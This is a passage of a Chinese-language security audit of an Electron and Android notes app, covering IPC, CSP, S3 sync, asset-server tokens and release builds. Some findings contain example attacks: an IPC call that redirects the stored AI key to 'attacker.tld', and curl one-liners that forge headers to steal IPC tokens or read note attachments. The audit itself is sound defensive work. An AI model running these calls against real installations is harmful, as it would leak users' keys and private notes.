# 02 安全审计（Electron 桌面 + Capacitor Android）

> 审计对象：`lakex-local-notes`（Electron 44 桌面 + Capacitor Android + 可选浏览器端）。
> **基线**：`master @ 41def9f0`（2026-10-27 18:24）+ 工作树 **49 项在途改动**（与安全相关的只有 `AndroidManifest.xml` 的 `windowSoftInputMode` 与 `MainActivity.kt` 的 WindowInsets 注入，均已核过，无安全语义变化）。
> **读取时间**：2026-10-27 **21:29–21:45**（其他会话在审计期间仍在改仓库 ⇒ 本文证据一律写「文件 + 符号」，行号仅作定位参考，可能漂移）。
> **只读声明**：本轮未改任何代码/配置/脚本；未起 Electron、未 build、未碰正式数据。证据来源 = read/grep/glob + 只读计算（CSP hash 重算、行数统计）。
> **威胁模型**（按任务要求）：本机可能被 ①恶意网页 ②恶意文档（含从云端/他端/导入的不可信正文） ③恶意深链/系统分享 ④被盗或被第三方控制的 S3 桶/笔记文件 攻击。
>
> **261028 用户复核与安全暂停（重要）**：用户指出本审计中多条「安全加固」与既有决定重复——此前有过一轮**去掉冗余/过度防御**的审计。对照 git 后确认：**CSP `http://127.0.0.1:*` 通配是功能性决定**（PDF/音视频内联、画板 data URL fetch；git `1ce3d3c2`/`4c2d2b49`），**不是新洞**；资产 token 仅对带 Origin 请求强制等条目也可能是既有有意设计。**用户裁定：安全审计暂停**，本批不再推进新安全项；已实现的 SEC-01/02/03（A 批）与浏览器 token/Origin（P0）保留在工作树，SEC-04/05 等**不做**，后续若要再谈安全需先对照历史决定与威胁模型。
>
> **261029 复核（本文件 §6）**：剩余项已按「不为无法出现的场景写防御代码」逐条给出功能口径裁决 —— **全部不做**（SEC-04/06/08/09/11/12 + SEC-13b/13e），只做两处**注释纠错**与一条发布正确性待办（SEC-03 真实 CI 首跑）；不新增任何防御代码。
>
> **Lead 核对（数字口径）**：IPC 通道数以 `electron/ipc/ipcChannelParity.test.ts:90-92` 的断言为准 = **135**（registrar / preload invoke / `WEB_METHODS` 三者一致）；本文 §1.2 的 138/132/124 是含 `handleEvent` 与 shim 手写行的另一统计口径，结论（三处镜像）不受影响。详见 `00-executive.md` §6。

---

## 0. 结论摘要（按严重度）

> **261028 晚注**：本节是审计当时（2026-10-27）的结论快照，**不代表当前状态**；逐条当前状态以文末「修复状态（261028）」表 + `13-audit-status.md` 为准（本文状态表已按工作树代码对齐）。

| # | 结论 | 严重度 |
|---|---|---|
| 1 | **AI「连通测试 / 拉模型」把已存 API Key 送往渲染层指定的任意 baseUrl**：草稿里换掉 `baseUrl`、不带 `apiKey`，主进程会**复用已存 Key** 发起请求 ⇒ 渲染层被控即可静默导出 AI Key，且该接口没有 SSRF/域名白名单。 | **P1** |
| 2 | **`save_s3_settings` 接受任意 endpoint/bucket/prefix**：渲染层可把同步目标整体改向攻击者的 https 桶，下一次整轮同步就把全库正文+附件上传出去（https 强制只在同步时才校验，存得进去）。 | **P1** |
| 3 | **Android 分发产物只有 debug APK**（`assembleDebug` + `minifyEnabled false`，debuggable + debug keystore），桌面 macOS/Windows 产物未签名/未公证；"暂不做签名"已定，但 **debug 包是功能上可调试的**，不只是"签名弱"。 | **P1** |
| 4 | **资产 HTTP 服务的 token 只在"带 Origin 的 CORS 请求"上校验**：本机任意进程（桌面）/ 设备上任意已安装 App（Android）不带 Origin 即可无凭据读取 note-assets 与 quick-notes 图片/附件（桌面 `assetServer.ts` 与 Android `AssetServer.kt` 同款设计）。 | **P2** |
| 5 | **浏览器端（webApiServer）的 `/__native.js` 门禁可被非浏览器客户端伪造**：手写 `Sec-Fetch-Site: none` 就能拿到全量 IPC token ⇒ "本机进程不能拿 token" 的注释假设不成立（服务默认关、需先开启，故 P2；与 `01-product-architecture.md` 的"删掉浏览器端"同向）。 | **P2** |
| 6 | **缺 session 权限收敛**：全仓 0 处 `setPermissionRequestHandler` / `setPermissionCheckHandler`（相机/麦克风/地理位置/通知/clipboard-read/loopback-network 等交给 Electron 默认策略）。 | **P2** |
| 7 | **CSP 与主进程都把 `http://127.0.0.1:*` 全端口放行**（桌面 prod/dev + 移动端 connect/img/media/object/frame）⇒ 渲染层可探测/滥用本机任意端口的本地服务（localhost SSRF），资产 token 也因此只对网页有效。 | **P2** |
| 8 | **Android 平台级加密/混合内容未收口**：`network_security_config.xml` 是 `base-config cleartextTrafficPermitted="true"`（对所有域，不只 127.0.0.1）；Capacitor 固定 `MIXED_CONTENT_ALWAYS_ALLOW` + `androidScheme: http`。 | **P2** |
| 9 | **Android WebView 的 JS 桥对象（含 Capacitor `androidBridge`）在整个 WebView 生命周期对任意文档可访问**，且 Capacitor `launchIntent` 明确放行 `data:`/`blob:` 在 WebView 内导航；缺 `removeJavascriptInterface` / 导航白名单收口。 | **P2** |
| 10 | **供应链两处漂移**：① AGENTS §2 宣称"依赖只有 Univer 一处补丁"，实际有 **3 个** patch（含 22KB 的 `@plait/draw`，打的是构建产物 `.mjs`，无完整性校验）；② CI 的 action 全用 mutable major tag（`@v4`/`@v2`）而非 commit SHA，release 用第三方 `softprops/action-gh-release@v2` 且 `contents: write`。 | **P2** |
| — | **要保住的资产**：IPC 来源双重判定（webContents 白名单 + 页面 URL）、路径段校验下沉到路径构造本身（37 处 `notePathFor` 全走 `bodyPathFor`）、SSRF 连接层钉死（DNS rebinding 已修）、prod CSP 的 `script-src` 无 `unsafe-inline/eval`（hash 实测对得上）、桌面 S3/AI Key `safeStorage` fail-closed、移动 Keystore AES-256-GCM、云端不可信 filename 的三层校验。这些都不该在重构中被削掉。 | — |

**一句话**：壳层在"**来源与路径**"上已相当扎实（CSP/IPC/路径/SSRF 都是可引用的正面样本），剩余风险几乎全在"**渲染层能动主进程手里的凭据与出网目标**"（SEC-01/02/05）与"**分发/平台配置的最后一公里**"（SEC-03/06/08/09）——不是补代码，而是收权限、收目标、收产物。

---

## 1. 现状盘点

### 1.1 审查范围与关键入口

| 边界 | 关键文件（符号） | 结论摘要 |
|---|---|---|
| 渲染层 → 主进程 | `electron/preload.cjs`（`contextBridge.exposeInMainWorld("lakeNative", …)`）、`electron/ipc/registrar.ts`（`createIpcRegistrar` / `handleEvent`）、`electron/ipc/register*.ts` | 138 个通道全部经 `validateSender`；来源判定 = `main.ts:isTrustedSenderFrame`（webContents 白名单 + `isAppPageUrl`） |
| 渲染层直接可见的"能力值" | `preload.cjs` 的 `assetPort` / `assetToken`（来自 `process.env.LAKE_ASSET_TOKEN`） | token 每次启动随机（`main.ts: crypto.randomBytes(32)`），与 web API token **已拆开**（代码注释即审计 A.3 修复） |
| 导航 / 开窗 / 外链 | `main.ts: will-navigate`、`setWindowOpenHandler` | 非应用页导航一律 `preventDefault`；`window.open` 仅 http(s) 交系统浏览器，其余 deny |
| 私有协议 | `electron/appOrigin.ts`（`isAppOriginUrl`、`resolveAppDistFile`）、`electron/appProtocol.ts` | 只服务 `dist/`；`decodeURIComponent` 后再做路径包含判定（编码穿越关闭） |
| 本地资源服务 | `electron/assetServer.ts`、`android/.../AssetServer.kt` | 127.0.0.1 固定端口 19876；ACAO 仅回显本应用 origin；**token 仅对带 Origin 的请求强制** |
| 浏览器端（可选） | `electron/webApiServer.ts`（`startWebApiServer` / `isCrossSiteRequest` / `isNativeShimAllowed` / `renderNativeShim`） | 默认关；仅 127.0.0.1；header token + 常量时间比较；静态只服务 dist |
| 路径 | `electron/store.ts: bodyPathFor/notePath/noteAssetsDirFor`、`src/core/noteBodyPaths.ts`、`src/core/storeUtils.ts: isSafePathSegment`、`electron/quickNotes.ts: itemPath/assetDirFor/stagingDirFor`、`electron/draftJournal.ts` | "校验下沉到路径构造"已落地；**未发现可用路径穿越** |
| 云端不可信数据 | `src/core/s3v3Keys.ts: assertSafeSegment`、`src/core/s3v3Index.ts: validateAssetDeclaration/validateLakeIndex/validateQuickNotesIndex`、`electron/s3v3/desktopStoreAdapter.ts: SAFE_ASSET_FILENAME` | 索引/声明里的 id 与 filename 全部段校验；桌面 `writeAsset` 二次校验 |
| 机密 | `electron/secretCipher.ts`（safeStorage，fail-closed）、`electron/settingsRepository.ts`、`android/.../SecureStorePlugin.kt` + `SecretBox.kt`、`src/mobile/native/keystoreSecretStore.ts` | 桌面 S3 Secret / AI Key 加密；移动 Keystore；**AK 与 endpoint 明文（属正常）** |
| AI | `electron/ipc/registerAi.ts`、`electron/ai/aiClient.ts`、`electron/ai/aiContentResolver.ts`、`android/.../AiChatPlugin.kt` | 字节只在主进程（`{noteId,filename}` 引用）✅；**baseUrl 来自渲染层且不做校验** ❌ |
| 出网（图片下载） | `electron/httpFetcher.ts`（`createPinnedHttpFetcher`，连接层钉死）、`electron/ssrf.ts` | SSRF 逐跳 + DNS 校验 + TOCTOU 修复（正面样本） |
| Android 组件 | `android/app/src/main/AndroidManifest.xml`、`res/xml/{network_security_config,file_paths,shortcuts,config}.xml`、`MainActivity.kt` | `allowBackup=false`、仅 INTERNET 权限、FileProvider `exported=false` 且只开 `note-assets/`；深链/分享入口无数据注入面 |
| 产物 / CI | `package.json`（`preinstall`/`postinstall`/`build`）、`patches/*`、`.github/workflows/*`、`docs/RELEASE.md` | 无硬编码凭据；未签名/未公证已文档化；**Android 只出 debug APK** |

### 1.2 度量（本次实测）

| 项 | 数值 |
|---|---|
| Electron 主进程/仓储源码 | 86 个非测试文件，**14 572 行** |
| Electron 测试 | 87 个文件，10 134 行 |
| `electron/ipc/*` | 1 276 行，9 个 `register*.ts` + registrar/errors |
| IPC 通道注册 | 138（136 `ipc.handle` + 2 `ipc.handleEvent`） |
| preload 暴露方法 | **132**（136 处 `invoke` + 5 个 `ipcRenderer.on` 订阅） |
| web `WEB_METHODS` | 124（与 preload 的差异由 `webApiServer.test.ts` 卡住） |
| Android Kotlin | 13 个文件 / 2 879 行，**9 个 Capacitor 插件**（OpenFile/PinShortcut/SharedContent/AssetSync/BodyStore/StylusInput/SecureStore/ShowKeyboard/AiChat） |
| 安全相关测试 | 至少 10 个文件 / 约 1 025 行（ssrf / httpFetcher / assetServer / appOrigin / webApiServer / secretCipher / attachmentOpen / registerSystemInfo / ipcChannelParity / mobileCspSingleSource） |
| CSP | 桌面 dev+prod 两套（`vite.config.ts: DEV_CSP/PROD_CSP`）+ 移动一套（`vite.mobile.config.ts: MOBILE_CSP`，单一来源、`%MOBILE_CSP%` 占位） |
| 补丁 | 3 个（`patches/@univerjs+ui+1.0.3.patch` 2.1KB、`patches/@plait+draw+0.93.4.patch` 22.8KB、`vendor/lakex-doc-react/patches/@xiangfa+mindmap+0.7.1.patch` 2.5KB），两个 patch 目录 |
| 桌面安全开关 | `contextIsolation: true` / `nodeIntegration: false` / `sandbox: true`（主窗口、boot、PDF 导出窗口三处一致）；`webviewTag`、`webSecurity`、`allowRunningInsecureContent` 均未改动（默认安全值） |

### 1.3 已核验通过（无需整改）——避免重复上报

| 核验点 | 结论与证据 |
|---|---|
| IPC 来源判定 | 双重：`trustedWebContents`（仅本进程创建的窗口）+ `isAppPageUrl(frame.url)`（打包版 = `isAppOriginUrl`，dev = 精确 dev server origin）⇒"被导航到恶意本地页后 preload 全量能力失效"成立（`main.ts: isTrustedSenderFrame`，注释即审计 #6 修复） |
| 私有协议穿越 | `resolveAppDistFile` 先 `decodeURIComponent` 再 `path.resolve` + 前缀判定，编码形态 `%2e%2e` 关闭 |
| 路径穿越（IPC） | `store.bodyPathFor` / `noteAssetsDirFor` / `notePath` 都在**路径构造处**校验段；`quickNotes` 三个路径助手、`draftJournal`、`orphanLifecycle` 双段校验、`assertAttachmentSegments`。**实测结论：渲染层拿不到任意文件读写通道**。读侧唯一"任意文件读"是 `pick_import_csv`（必须先由用户点系统选择框、≤20MiB）；写侧 `export_*` / `run_workspace_backup` / `save_asset_as` 也全部要求"目录/文件来自本进程系统选择框"（`registerNotes` 的 `lastPickedExportDir/lastPickedBackupDir` 判据）或主进程自建路径 |
| 云端不可信 filename | 声明（`validateAssetDeclaration`）、索引（`validateLakeIndex/QuickNotesIndex`）、桌面落盘（`SAFE_ASSET_FILENAME`）三层拦截 ⇒ `..`、反斜杠、绝对路径都进不来；移动端 `writeQuickAsset` 自身没校验但上游声明已校验（见 SEC-13a） |
| 附件 shell 打开 | `isSafeShellOpenFilename` 执行类黑名单 + **未知扩展名 fail-closed**；`.html/.htm` 不在资产白名单 ⇒ 无法用默认程序打开；SVG 显式禁掉（file:// 下 CSP 无效） |
| 附件内联服务的 MIME | `MIME_BY_EXT`（`src/core/assetNaming.ts`）**没有 html**，未知一律 `application/octet-stream` + `X-Content-Type-Options: nosniff` ⇒ 恶意附件不能以 HTML 在 127.0.0.1 源里执行；SVG 另加 `sandbox; default-src 'none'` CSP（桌面与 Android 逐字一致） |
| prod CSP | `script-src 'self' 'sha256-r1Dc…'`（**本审计重算 inline KITCHEN_URL 的 sha256，与之逐字符一致**）、无 `unsafe-inline/unsafe-eval`；img/connect 只放行 self/data/blob/127.0.0.1 ⇒ 即便内核把恶意正文里的 script/onerror 插进 DOM 也不会执行、也无外发通道 |
| 外链 / 开窗 | `will-navigate` 拦非应用页；`setWindowOpenHandler` 只对 http(s) 调 `shell.openExternal` 并一律 `deny` 新窗口；全仓 `openExternal` 只有两处（另一处 `registerWeb` 用主进程构造的固定 URL） |
| SSRF（图片/远程资源） | `createPinnedHttpFetcher` 逐跳校验 + `lookup` 钉死已校验地址（DNS rebinding 关闭）+ 头/体整体超时 + 25MiB/像素上限；字面 IP、localhost、IPv4-mapped IPv6 都拦 |
| 桌面机密 | `safeStorage` 不可用或 Linux `basic_text` ⇒ **fail-closed 拒绝保存**；`get_s3_settings` 用 `********` 掩码，回传掩码时保留原 secret（W-14）；恢复 seed 只写密文行、永不解密落盘 |
| 移动机密 | S3 Secret 与 AI Key 都走 AndroidKeyStore（AES-256-GCM，独立 alias/prefs），localStorage 只存非机密字段（`src/mobile/bridge/sync.ts: saveS3Settings` 解构剔除 secret）；解密失败清键让用户重填 |
| 日志 | `docs/LOGGING.md:45` 明确"不记录正文/密钥/凭据/剪贴板"；全仓未发现打印 secret 的语句；`crashReporter` 本地留档 `uploadToServer:false`、无错误上报端点 |
| localStorage | 只有 UI 偏好/排序/导航/设备 id/标签页会话（工作树新增 `tabSession` 只存 noteId）；**无正文、无密钥** |
| XSS（历史快照/搜索摘要） | `NoteInfoDialog` 已把"直接 dangerouslySetInnerHTML 注入快照 lake 正文"改成只读内核 viewer（注释即 XSS 面修复）；全仓 dangerouslySetInnerHTML 仅 2 处搜索摘要，且 `buildSnippet` **先转义再拼 mark**（含引号），未发现可注入点 |
| Android 组件面 | `allowBackup="false"`、仅 INTERNET、FileProvider `exported="false"` + `grantUriPermissions` + `file_paths` 只含 `note-assets/`；`OpenFilePlugin.isUnderAppSandbox` + 扩展名白名单（native 侧也拦，注释 DS 复核 A4）；`SharedContentPlugin` 落地名随机 UUID、25MiB 上限；深链只决定"进 capture"，无参数注入 |
| 系统分享文本 | 原文进小记 seed，但正文以 Lake 文档数据渲染（CSP 兜底），不构成注入面 |

### 1.4 与已定稿决策重叠（**已定不做，勿重提**）

| 事项 | 出处 |
|---|---|
| `LLN1.` 迁移码用固定种子，仅防误读、**不是安全边界** | `AGENTS.md` §4「S3 配置迁移」+ `src/core/s3ConfigTransfer.ts` 头注释；怀疑泄露就轮换 S3 密钥 |
| macOS 不签名/不公证、Windows 不签名 | `HANDOFF.md` §0「261027 下一步①」+ `docs/RELEASE.md` §七/§五（用户决定暂不做） |
| 闭源内核以 vendored 形式公开分发、未取得授权 | `AGENTS.md` §2「闭源内核分发（261022 定稿）」+ `NOTICE` |
| 移动端 S3 密钥必须可被 JS 读出（签名在 JS），Keystore 只保"静态" | `AGENTS.md` §5 + `docs/HANDOFF.md` §3#7c + `secretStore.ts` 头注释 |
| 浏览器端去留 | `01-product-architecture.md` 已列 P1「删除或只读化」；本文只补安全维度证据，不重复立项 |
| 墓碑/删除/保留等数据语义 | `AGENTS.md` §3/§4、HANDOFF §3；不在本文范围 |

---

## 2. 问题清单

### SEC-01 [P1] AI 连通测试/拉模型：已存 API Key 可被送往渲染层指定的任意 baseUrl

- **证据**
  - `electron/ipc/registerAi.ts: resolveDraftProvider`：`mergeAiSettings(settings, { providers: [{ ...d, id }] })` —— 草稿只覆盖它给了的字段。
  - `src/core/aiProviders.ts: mergeAiSettings`：`let apiKey = base.apiKey; if (p.clearApiKey) … else if (p.apiKey) …` ⇒ **草稿不带 apiKey 时保留已存 Key**。
  - `src/core/aiProviders.ts`：`baseUrl: asTrimmed(p.baseUrl, base.baseUrl)` —— 无协议/域名/白名单校验（全仓 grep baseUrl 无 URL 校验）。
  - `electron/ai/aiClient.ts: defaultAiClientFactory`：`new OpenAI({ apiKey: provider.apiKey, baseURL: provider.baseUrl })` ⇒ `Authorization: Bearer <真实 Key>` 发往草稿给的地址。
  - 可达通道：`ai_test_connection` / `ai_list_models`（不需要用户可见确认；二者都在 `WEB_METHODS` 里，浏览器端同样可达）。
  - 持久化变体：`ai_save_settings` 也接受任意 baseUrl（同一个 `mergeAiSettings`）⇒ 改存一次之后，**每次正常对话**都会把 Key 发往该地址；这条不依赖草稿语义，风险更高。
- **影响**：渲染层被控（XSS/恶意 chunk/被替换的 dist）后，一条 `ai_test_connection({providers:[{id:"deepseek", baseUrl:"https://attacker.tld"}]})` 就能**把长期 API Key 静默送到攻击者**，用户侧零可见（返回 `{ok:false,retryable:true}` 看起来像网络问题）。等价于"渲染层可读主进程 AI 凭据"，与 `AGENTS.md` §4「Key 不出主进程」直接冲突。另：该通道也是**不受 SSRF 保护的主进程出网原语**。
- **建议**
  - ① 激进：**删掉"草稿带 baseUrl"这条路径**——只接受 `{providerId, apiKey?, model?}`，baseUrl 只能用已保存值；若产品必须要"先测再存"，则测试时必须同时提供完整 apiKey（不复用已存 Key），并在主进程校验 baseUrl ∈ `AI_PROVIDERS` 白名单或 https + 非私网。草稿合并限定为 model/temperature/reasoningEffort/thinking 四个非机密字段。
  - ② 保守：在 `registerAi.resolveDraftProvider` 里，若 `d.baseUrl` 与已存不同且 `d.apiKey` 为空 ⇒ 返回 `{ok:false,error:"修改服务地址时必须重新填写 API Key"}`；并对 baseUrl 走与 `validateS3Settings` 同款"强制 https"（本地调试白名单 127.0.0.1）。
- **成本**：S（保守 ~30 行 + 2 测试；激进需改设置页"测试连通"交互，M）
- **状态**：新发现

### SEC-02 [P1] `save_s3_settings` 接受任意 endpoint/bucket/prefix ⇒ 渲染层可把"全库上传目标"改向

- **证据**
  - `electron/ipc/registerSync.ts: assertS3Settings`：只校验 6 个字段是字符串且长度 ≤2048/512、`forcePathStyle` 是 boolean —— **没有 URL 校验**。
  - `src/core/syncUtils.ts: validateS3Settings`（强制 https、非法 URL 拒绝）只在**同步/测连通时**调用：`electron/syncEngineController.ts:81/138`、`electron/s3Store.ts:235` ⇒ 恶意 endpoint 可以**存进设置表**，下一次 `sync_now` 才生效（此时是正常的"同步成功"路径）。
  - 目标消费点：`electron/s3v3/desktopSync.ts` 读 `settings.endpoint/bucket/accessKeyId/secretAccessKey` 建 `S3Client`。
  - `run_s3_deep_cleanup` / `sync_now` 都是渲染层一条 IPC 就能触发。
- **影响**：渲染层被控即可"把用户全库（正文 + 附件 + 小记）同步到攻击者控制的 https 桶"，用户以为在正常同步。这是**数据外泄**而非凭据外泄（SigV4 不暴露 secret）。需已配置 S3（`requireCloud()` 门禁），故是"已上云用户"的风险。
- **建议**
  - ① 激进：把 endpoint 视为敏感配置——只允许设置页（可见用户交互）修改；主进程记住"最近一次成功同步的 endpoint"，变更时要求渲染层无法伪造的确认（如主进程 `dialog.showMessageBoxSync`"同步目标将从 A 改为 B，确认吗？"，否则拒绝）；对 endpoint 复用 `ssrf.ts` 做"非私网 + https + 非 IP 字面量（除 localhost）"校验。
  - ② 保守：`assertS3Settings` 内直接调 `validateS3Settings`（非法 URL/明文 http 挡在保存前）+ 变更 endpoint 时写 `log.s3.warn` 并在 UI 给一次性横幅"同步目标已变更"。
- **成本**：S（保守）/ M（激进，含主进程确认框）
- **状态**：新发现

### SEC-03 [P1] 发布产物完整性：Android 只有 debug 包（可调试），桌面/Windows 未签名

- **证据**
  - `.github/workflows/release.yml`：Android job `./gradlew assembleDebug` + `continue-on-error: true`，产物名 `LakexLocalNotes-<ver>-android-debug.apk`；`release` job 只要求 `needs.macos.result == 'success'` ⇒ **Android 构建失败也会发版，且永远发的是 debug 包**。
  - `android/app/build.gradle`：`buildTypes.release { minifyEnabled false }`，无 `signingConfigs` ⇒ 连 release 变体也没有签名配置。
  - `docs/RELEASE.md` §七/§五 已写明"debug 签名；正式版换 release keystore""未签名/未公证"（**签名缺失本身是已记录决策**）。
  - macOS job：`CSC_IDENTITY_AUTO_DISCOVERY: "false"` + `--publish never`，无 hardenedRuntime/entitlements（`package.json: build.mac` 只有 category/target/icon）。
- **影响**：debug APK = `android:debuggable=true`：任何拿到安装包的人（或同机 adb）可 `run-as` 进应用私有目录读 SQLite/正文/SharedPreferences（Keystore 密文仍在硬件保护内，但 DB 里是明文笔记），也可对 WebView 挂调试器注入 JS ⇒ 直接绕过全部"渲染层不可信"假设。分发层面：无签名 + 无公证/无校验和 ⇒ 下载链路被替换时用户无提示、也无法验证产物来源。
- **建议**
  - ① 激进：Android 走 **release 变体 + 独立 keystore（CI secrets）**，`minifyEnabled true` + R8（注意 Capacitor 反射，需 proguard 规则），只在 `workflow_dispatch`/tags 出包；Android job 从 `continue-on-error` 改为硬门禁（或至少产物不随 release 发布）；桌面在签名之前**至少附 SHA-256 校验和**（CI 生成 `.sha256`），把"静默替换"变成"可发现替换"。
  - ② 保守：Android 改 `assembleRelease` 并用 debug keystore 签（`signingConfig = signingConfigs.debug`）——**debuggable=false 立刻生效**，签名强度不变但去掉最大风险；`continue-on-error` 至少改成只影响上传、不进 release assets。
- **成本**：S（保守：gradle 3 行 + CI 1 行）/ M（激进：keystore 管理 + R8 + 冒烟回归）
- **状态**：新发现（"未签名/未公证"已定；"**debug 包 + debuggable**"未被记录为风险）

### SEC-04 [P2] 资产服务 token 只对"带 Origin 的请求"生效 ⇒ 本机进程/设备上其它 App 可无凭据读取

- **证据**
  - `electron/assetServer.ts`：`if (req.headers.origin && assetToken && parsed.searchParams.get("token") !== assetToken) { 403 }` —— **无 Origin 直接跳过 token 校验**；`isAllowedOrigin` 同样 `if (!origin) return true`；`server.listen(ASSET_PORT, "127.0.0.1")`。
  - Android `AssetServer.kt: isAuthorized`：`if (origin == null) return true; if (ALLOWED_ORIGIN != origin) return false; …` —— 同款；`ServerSocket(PORT, BACKLOG, InetAddress.getByName("127.0.0.1"))`。
  - 设计意图写在注释里（"img 等非 CORS 请求不带 Origin，浏览器本就不允许跨源读 img 字节"），对**网页**成立；对**本地进程**不成立。
- **影响**：桌面端任意同用户进程 `curl http://127.0.0.1:19876/{noteId}/{file}` 即可拿图片/附件（含 PDF、压缩包）；Android 上任何已安装 App 都能连 127.0.0.1:19876（无需权限）。需要知道 noteId（uuid）与 filename（时间戳+随机）⇒ 实际是"无法枚举但无法阻止已知路径读取"；对**被盗笔记文件**场景（攻击者拿到过一份数据目录备份）意味着残留的已知路径可被批量拉取。`/quick-notes/staging/{draftId}/*` 同样暴露未落库草稿图。
- **建议**
  - ① 激进：**token 对所有请求强制**，由主进程给渲染层发出的资源请求补 token（`main.ts: registerAssetTokenRedirect` 已具备该能力：只对 trusted webContents 注入 token）——删掉"无 Origin 免检"，Android 侧同理（页面本身持有 token，注入到 URL）。顺手删掉 Origin 白名单这套二判据。
  - ② 保守：只对非 vendor 路径（`/vendor/cdn/*` 保持公开）要求 token，并给"无 Origin 也要求 token"的开关（默认开）；渲染层所有 `<img src>` 统一由 `src/core/assetUrl.ts` 带 token（已有单一来源）。
- **成本**：M（① 需全链路验图/PDF/音视频/Range/缩略图 + 两端设备回归；② 面较小但仍要设备回归）
- **状态**：新发现（"外站 CORS 读不到"已修属已定稿；"本机进程可读"未记录）

### SEC-05 [P2] ~~CSP 与主进程把 `http://127.0.0.1:*` 全端口放行~~ **261028 复核：已定不做（有意为之）**

- **证据**
  - `vite.config.ts`：`DEV_CSP` 与 `PROD_CSP` 的 img/font/connect/media/object/frame 均为 `http://127.0.0.1:*`；`vite.mobile.config.ts: MOBILE_CSP` 同样（`connect-src … http://127.0.0.1:* ws://127.0.0.1:*`）。
  - `electron/main.ts: registerCdnRedirect` / `registerAssetTokenRedirect` 只处理 `ASSET_PORT`，其它端口不受主进程约束。
  - 主进程自己的出网（`resourceRepository.downloadRemote`）有 SSRF 防护，**但渲染层 fetch 不走主进程**。
- **影响**：渲染层一旦被控，可把本机**任意端口**当目标：探测开放端口、读取本机其它服务（Ollama/Jupyter/Docker 等无鉴权 HTTP API）、把笔记内容 POST 给本机恶意服务（绕过"外发无通道"的假设）。这是 SEC-04 的放大器。
- **建议**：① 激进：prod CSP 收紧为 `http://127.0.0.1:19876`（构建期常量；若允许 `LAKE_ASSET_PORT` 覆盖，就在构建时注入该常量而非 `*`），dev 保留通配；`ws://` 只在 dev 放行。② 保守：至少把 `connect-src` 收成 19876，并在 e2e 里加一条"fetch 到 19877 被 CSP 拦"的负向探针。
- **成本**：S（改 2 个常量 + 移动端 CSP 单源测试）
- **状态（261028）**：**已定不做 / 有意为之**——该通配是为 PDF/音视频内联与画板 data URL fetch 放开的（git `1ce3d3c2`/`4c2d2b49`），属"去过度防御"范围；本轮曾误收窄，已**撤回**（`vite.config.ts` 恢复通配并加注释）。

### SEC-06 [P2] 没有 session 级权限收敛（permission request/check handler）

- **证据**：全仓 grep `setPermissionRequestHandler|setPermissionCheckHandler` → **0 命中**；`electron/main.ts` 只做了 `webRequest.onBeforeRequest` 两条重定向，未碰 `session.defaultSession` 的权限面。
- **影响**：应用页（或任何在该 session 里被加载的内容，含 blob: 文档）请求 media（麦克风/摄像头）/geolocation/notifications/clipboard-read/pointerLock/local-network-access 等时，行为取决于 Electron 默认策略（Electron 文档口径为默认放行；**本项未做运行态取证**）。本地笔记应用不需要这些能力；一旦被控，麦克风/摄像头/剪贴板是笔记内容之外的额外外泄面。
- **建议**：① 激进：`setPermissionRequestHandler` + `setPermissionCheckHandler` 全拒（白名单只留实测必需的 clip-sanitized-write/fullscreen），在 `app.whenReady` 对 `session.defaultSession` 一次装好；② 保守：只装 request handler 全拒，先跑 3 条 UI 回归（PDF 内联预览、附件音视频播放、复制图片到剪贴板）。
- **成本**：S（~20 行 + 手工点 3 处）
- **状态**：新发现

### SEC-07 [P2] 浏览器端 `/__native.js` 的 `Sec-Fetch-Site` 门禁对非浏览器客户端无效

- **证据**
  - `electron/webApiServer.ts: isNativeShimAllowed`：`return sfs === "same-origin" || sfs === "none"`；注释假设"同机其它端口页面用 script src 拉取时是 same-site 且无 Origin，不能放行"——这只对浏览器成立。
  - `isCrossSiteRequest`：只有 `sfs === "cross-site"` 才拒；Host 必须是 `127.0.0.1:<port>`。
  - `renderNativeShim` 把 `API_TOKEN` 与 `ASSET_TOKEN` 直接写进响应体。
- **影响**：web 客户端开启期间，本机任意进程 `curl -H 'Sec-Fetch-Site: none' http://127.0.0.1:19880/__native.js` 即拿到全量 IPC token，随后可 `POST /api/*` 调 124 个通道（含 `save_s3_settings` / `sync_now` / `open_attachment` / `reveal_data_folder`）。威胁方是"同用户本机进程"（本来就能直接读 userData），**净增风险有限**；但这条把"进程级隔离"降成"文件系统隔离"，并让 SEC-02 的攻击者不必入侵渲染层就能改 endpoint。注释的安全断言需修正。
- **建议**（用户 261028 已裁决浏览器端保留，原"删除"选项作废）：① **必做（本项 P1 化）**：token 不再经 `/__native.js` 无条件下发——改为"一次性 URL fragment / 设置页复制"或"仅同源 document + Origin==Host 才下发"，并把判定改写为"只认 same-origin 且必须有 Origin 头"（对齐思源的 `CheckOrigin + IsSessionOriginAllowed`）；② 同时把 `/api` 与 `/__events`(SSE) 的 Origin 校验统一到同一函数，禁止 `Sec-Fetch-Site: none` 作为放行依据。
- **成本**：S（② ~10 行）
- **状态**：新发现（功能去留归 01 文档；此条只要求修注释/门禁）

### SEC-08 [P2] Android 平台加密/混合内容：全局 cleartext + `MIXED_CONTENT_ALWAYS_ALLOW`

- **证据**
  - `android/app/src/main/res/xml/network_security_config.xml`：`<base-config cleartextTrafficPermitted="true" />` + 注释"domain 不支持 IP 字面量，base-config 直接放行（开发版）"——**发布版沿用同一份**（261029：该注释已改为「发布配置」，见 §6）。
  - `capacitor.config.ts`：`server.androidScheme: "http"`、`server.cleartext: true`（注释解释原因：https 会让 127.0.0.1 的 media 被判混合内容）。
  - `node_modules/@capacitor/android/…/Bridge.java:595`：`settings.setMixedContentMode(MIXED_CONTENT_ALWAYS_ALLOW)`（Capacitor 固定行为）。
- **影响**：应用内**任何** http 目标都被允许（S3 endpoint 若被改成 http，移动端有 validateS3Settings 兜底；任意 http 资源/内联预览都放行）；配合 `androidScheme:http`，页面本身不是 secure context；`ACAO: http://localhost` 的固定回显也建立在"页面恒为 http://localhost"这一前提上。
- **建议**：① 激进：NSC 只对 **localhost 域名**放行 cleartext、base-config 改 false（`<domain-config cleartextTrafficPermitted="true"><domain includeSubdomains="false">localhost</domain></domain-config>`）——注意 **NSC 的 `<domain>` 不接受 IP 字面量**（这正是本项目当初写 base-config 的原因），所以必须同时把移动端资产 URL 从 `127.0.0.1:19876` 改成 `localhost:19876`（单一来源 `src/core/assetUrl.ts` + Android `AssetServer.kt` 的 `ALLOWED_ORIGIN` 同步），并把 `capacitor.config.ts` 的 `cleartext` 只留 debug。② 保守（不改 URL 的最小方案）：把 `cleartextTrafficPermitted="true"` 只放在 **debug 变体**（`android/app/src/debug/res/xml/` 覆盖同名文件，release 用 `base-config cleartextTrafficPermitted="false"` + localhost 例外；若 release 因此无法加载 19876 的资源，则说明 SEC-04 的 URL 改造是前置条件）。③ 